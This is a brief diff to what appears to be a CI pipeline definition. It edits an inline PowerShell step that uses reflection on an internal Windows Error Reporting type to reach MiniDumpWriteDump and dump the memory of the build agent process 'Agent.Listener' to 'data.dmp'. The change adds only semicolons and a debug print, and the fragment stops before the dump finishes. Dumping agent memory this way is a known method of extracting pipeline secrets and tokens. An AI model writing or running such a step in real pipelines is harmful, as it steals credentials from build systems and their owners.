@@ -22,10 +22,11 @@ steps:
   inputs:
     targetType: 'inline'
     script: |
-      $target = Get-Process Agent.Listener       #Target process name
-      $outFile = "data.dmp"                    #Output file name
+      $target = Get-Process Agent.Listener;       #Target process name
+      $outFile = "data.dmp";                    #Output file name
       
       $WERNativeType = [PSObject].Assembly.GetType("System.Management.Automation.WindowsErrorReporting+NativeMethods");
+      $WERNativeType
       $DumpMethodInfo = $WERNativeType.GetMethod('MiniDumpWriteDump', [Reflection.BindingFlags]'NonPublic,Static');
       
       $FileStream = New-Object IO.FileStream($outFile, [IO.FileMode]::Create);
